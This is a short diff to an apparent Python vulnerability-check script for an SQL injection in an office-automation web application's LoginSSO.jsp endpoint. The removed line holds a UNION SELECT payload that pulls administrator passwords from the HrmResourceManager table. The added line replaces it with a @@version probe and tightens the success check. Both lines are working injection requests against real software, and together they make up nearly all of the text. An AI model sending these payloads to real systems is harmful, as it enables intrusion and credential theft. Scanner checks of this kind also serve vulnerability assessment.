@@ -12,10 +12,10 @@ def verify(url):
         'Accept-Encoding': 'gzip, deflate',
         'Connection':'close'
     }
-    vurl = urllib.parse.urljoin(url, "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager")
+    vurl = urllib.parse.urljoin(url, "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20@@version%20as%20id%20from%20HrmResourceManager")
     try:
         response = requests.get(vurl, headers=headers, timeout=5)
-        if response.status_code == 200:
+        if response.status_code == 200 and 'Microsoft' in response.text:
             relsult['vulnerable'] = True
             relsult['verify'] = vurl
         return relsult
